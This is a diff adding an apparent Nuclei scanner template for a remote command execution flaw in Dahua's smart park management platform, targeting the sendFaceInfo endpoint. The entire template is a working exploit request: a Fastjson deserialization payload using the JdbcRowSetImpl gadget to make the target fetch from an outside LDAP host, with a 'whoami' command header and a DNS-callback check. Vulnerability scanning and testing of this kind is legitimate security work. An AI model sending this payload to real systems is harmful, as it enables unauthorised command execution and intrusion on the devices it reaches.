@@ -1,0 +1,26 @@
+id: Dahua-wpms-sendFaceInfo-rce
+ 
+info:
+  name: 大华-智慧园区综合管理平台-wpms-sendFaceInfo-远程命令执行
+  author: pitaya
+  severity: high
+ 
+http:
+  - raw:
+      - |
+        POST /CardSolution/card/face/sendFaceInfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: application/json
+        Testcmd: whoami
+ 
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/e","autoCommit":true}}}
+ 
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
